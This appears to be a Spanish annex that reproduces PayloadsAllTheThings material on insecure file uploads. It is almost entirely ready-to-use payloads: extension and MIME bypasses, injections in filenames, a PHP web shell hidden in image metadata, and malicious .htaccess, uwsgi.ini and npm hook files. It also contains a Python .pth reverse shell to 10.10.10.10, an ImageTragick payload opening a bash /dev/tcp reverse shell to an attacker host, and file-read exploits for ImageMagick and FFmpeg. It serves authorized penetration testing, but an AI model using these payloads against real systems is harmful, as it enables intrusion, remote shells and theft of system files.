# Vulnerabilidades de subida de archivos: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Upload Insecure Files/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Upload%20Insecure%20Files/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Metodología / Defaults Extensions

```powershell
    .php
    .php3
    .php4
    .php5
    .php7

    # Less known PHP extensions
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
```

```powershell
    .asp
    .aspx
    .config
    .cer # (IIS <= 7.5)
    .asa # (IIS <= 7.5)
    shell.aspx;1.jpg # (IIS < 7.0)
    shell.soap
```

### Variantes presentes en tablas o texto del apartado

```text
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions
.pl, .pm, .cgi, .lib
.cfm, .cfml, .cfc, .dbm
.js, .json, .node
.svg
.gif
.csv
.xml
.avi
.js
.zip
.html
```

## 2. Metodología / Upload Trucos

```cs
    Content-Type: image/gif
    Content-Type: image/png
    Content-Type: image/jpeg
```

```cs
    text/php
    text/x-php
    application/php
    application/x-php
    application/x-httpd-php
    application/x-httpd-php-source
```

```html
    <script language="php">system("id");</script>
```

```php
    <?=`id`?>
```

### Variantes presentes en tablas o texto del apartado

```text
.jpg.php, .png.php5
.php.jpg
.pHp, .pHP5, .PhAr
pathinfo()
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
file.php......
file.php%20
file.php%0d%0a.jpg
file.php%0a
name.%E2%80%AEphp.jpg
name.gpj.php
file.php/
file.php.\
file.j\sp
file.j/sp
file.jsp/././././.
Content-Disposition: form-data; name="anyBodyParam"; filename*=UTF8''myfile%0a.txt
require_once
\x20
\x22
\x2E
\x3C
\x3E
\x2F
\x5C
move_uploaded_file
web<<
web**
web.config
\x3F
\x2A
Content-Disposition
Content-Type : application/x-php
Content-Type : application/octet-stream
Content-Type : image/gif
Content-Type
\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
\xff\xd8\xff
GIF8;
file.asax:.jpg
file.asp::$data.
<?php
<script language="php">
<?=
<?php echo
```

## 3. Metodología / Filename Vulnerabilities

### Variantes presentes en tablas o texto del apartado

```text
poc.js'(select*from(select(sleep(20)))a)+'.extension
image.png../../../../../../../etc/passwd
'"><img src=x onerror=alert(document.domain)>.extension
../../../tmp/lol.png
; sleep 10;
```

## 4. Metodología / Picture Compression

### Variantes presentes en tablas o texto del apartado

```text
curl 'http://localhost/test.php?0=system' --data "1='ls'"
getimagesize()
imagecreatefromgif()
```

## 5. Metodología / Picture Metadata

```ps1
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

### Variantes presentes en tablas o texto del apartado

```text
exiftool
```

## 6. Configuration Archivos / Apache: .htaccess

```ps1
AddType mime-type extension [extension ...]
```

```ps1
AddType application/x-httpd-php .rce
```

### Variantes presentes en tablas o texto del apartado

```text
.htaccess
.rce
```

## 7. Configuration Archivos / WSGI: uwsgi.ini

```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[ATTACKER.DOMAIN.TLD])
; read from http
test = @(http://[ATTACKER.DOMAIN.TLD])
; read from a file descriptor
content = @(fd://[ATTACKER.DOMAIN.TLD])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)
```

### Variantes presentes en tablas o texto del apartado

```text
uwsgi.ini
```

## 8. Configuration Archivos / Dependency Manager

```js
    "scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }
```

```js
    "scripts": {
        "pre-command-run" : [
        "/bin/touch /tmp/pwned.txt"
        ]
    }
```

## 9. Configuration Archivos / Python Path Archivo

```py
/usr/lib/pythonX.Y/site-packages/
/usr/local/lib/pythonX.Y/dist-packages/

# home location
/root
/home/$USER
```

```bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > /usr/local/lib/python3.6/site-packages/persistence.pth
```

### Variantes presentes en tablas o texto del apartado

```text
.pth
site-packages
dist-packages
python3 -m site
```

## 10. CVE - ImageMagick / CVE-2016–3714 - ImageTragik

```powershell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context
```

```powershell
    %!PS
    userdict /setpagedevice undef
    save
    legal
    { null restore } stopped { pop } if
    { legal } stopped { pop } if
    restore
    mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

```ps1
convert shellexec.jpeg whatever.gif
```

## 11. CVE - ImageMagick / CVE-2022-44268

```ps1
    apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png
```

### Variantes presentes en tablas o texto del apartado

```text
convert pngout.png pngconverted.png
identify -verbose pngconverted.png
python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'
Picture ImageMagick/
```

## 12. Metodología / CVE - FFMpeg HLS

```ps1
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```

### Variantes presentes en tablas o texto del apartado

```text
./gen_xbin_avi.py file://<filename> file_read.avi
file_read.avi
ffmpeg -i file_read.avi output.mp4
<filename>
CVE FFmpeg HLS/
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
